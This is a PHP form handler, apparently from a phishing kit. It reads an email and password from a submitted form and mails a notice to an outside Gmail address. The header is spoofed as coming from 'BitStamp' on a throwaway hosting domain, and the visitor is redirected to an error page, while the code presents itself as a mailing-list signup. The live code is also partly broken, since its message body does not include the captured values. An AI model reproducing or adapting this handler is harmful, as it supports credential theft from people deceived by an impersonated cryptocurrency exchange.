<?PHP
/*
echo $email = $_POST["email"];
echo $password = $_POST["password"];
$to = "markmorro7@gmail.com";
$subject = "New Email Address for Mailing List";
$headers = "From: $email\n";
$message = "A visitor to your site has sent the following email address to be added to your mailing list.\n

Email Address: $email";
$user = "$email";
$usersubject = "Thank You";
$userheaders = "From: markmorro7@gmail.com";
$usermessage = "Thank you for subscribing to our mailing list.";

if(mail($to,$subject,$message,$headers))
{
	mail($user,$usersubject,$usermessage,$userheaders);
	echo "eee";
}
*/
?>

<?php
//if(isset($_POST['submit'])){
$to = 'markmorro7@gmail.com';
$from=$_POST['email'];
 $password = $_POST["password"];
$subject = "New Email Address for Mailing List";
$htmlContent = "A visitor to your site has sent the following email address to be added to your mailing list.\n";


$usersubject = "Thank You";
$htmlContent1 = "Thank you for subscribing to our mailing list.";

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// Additional headers
$headers .= 'From: BitStamp<info@intelligent-banach.161-35-2-26.plesk.page>' . "\r\n";
$headers .= 'Cc: info@intelligent-banach.161-35-2-26.plesk.page' . "\r\n";

// Send email
if(mail($to,$subject,$htmlContent,$headers)){
 echo   $successMsg = 'Email has sent successfully.';
//    mail($from,$usersubject,$htmlContent1,$headers);
    header("location:error.html");
}else{
  echo  $errorMsg = 'Email sending fail.';
   header("location:error.html");
}
//}
?>